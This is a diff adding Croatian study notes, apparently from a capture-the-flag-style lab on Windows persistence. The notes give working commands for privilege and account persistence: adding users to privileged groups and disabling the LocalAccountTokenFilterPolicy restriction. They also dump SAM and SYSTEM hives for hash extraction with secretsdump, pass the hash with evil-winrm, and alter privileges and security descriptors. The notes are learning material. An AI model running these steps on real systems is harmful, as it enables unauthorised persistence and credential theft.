@@ -1,3 +1,58 @@
 Za početaj najlakša stvar koju mozemo pokusati je dodati korisnika u admin grupu:
 
 C:\> net localgroup administrators userAccount /add
+ili
+C:\> net localgroup "Backup Operators" thmuser1 /add
+ili
+C:\> net localgroup "Remote Management Users" thmuser1 /add
+
+Naš cilj je omogučiti korisnicima da imaju administratorske ovlasti dok su spojeni remote.
+Zbog UAC (User Account Control) tokena LocalAccountTokenFilterPolicy koji mice administratorske ovlasti svakoga računa kada mu se pristupi remote.
+Kako bi dobili administratorkse ovlasti trebamo iskljuciti LocalAccountTokenFilterPolicy i postaviti ga na 1:
+
+C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+
+Nakon što smo uspjesno omogucili pristup remote korisnicima administratorksa prava, instaliram sam i system .bak datoteke
+reg save hklm\system system.bak
+reg save hklm\sam sam.bak  
+
+download sam.bak system.bak
+
+koristeci pyhon secretsdump ispisujem sve potrebne podatke iz njih:
+
+impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+
+Iz toga dobivamo hash korisnika, tako da se mozemo preko evil-winrm logirati
+evil-winrm -i 10.10.42.120 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
+
+Special Privileges and Security Descriptors
+Slicno prijasnjem primjeru, no u ovome slucaju ne mjenjamo specifikacije grupa.
+
+Ovaj exploit se bazira na dozvolama:
+
+SeBackupPrivilege
+SeRestorePrivilege
+
+Prvo trebamo ispisati i spremiti datoteku config.inf:
+
+secedit /export /cfg config.inf
+
+Kada smo to dobili dodajemo u redove koji sadrže SeBackupPrivilege, SeRestorePrivilege ime trenutnoga računa.
+Kako bismo spremili tu datoteku moramu ju convertati u sdb format koristeci ove naredbe:
+
+secedit /import /cfg config.inf /db config.sdb
+secedit /configure /db config.sdb /cfg config.inf
+
+Sada bi trebali imati te dozvole na nasemu racunu, a to provjerimo preko: whoami /priv
+No sada cemo napraviti nesto drukcije od prosle vjezbe. Umjesto da dodajemo korisnika u remote access grupu, izmjeniti cemo sigurnosni deskriptor.
+Kako bi otvorili taj deskriptor preko powershella izvrsavamo naredbu:
+
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+
+I preko grafickog sucenja dodajemo korisnika u grupu i stavljamo mu prava (Full Control)
+Sada sve što je potreebno izbaciti hasheve i podatke (TO SMO NAPRAVILI U PROSLOME ZADATKU)
+Mozemo provjeriti kako izgledaju informacije o nasem korisniku preko net uset Korisnik
+
+
+
+RID hijacking
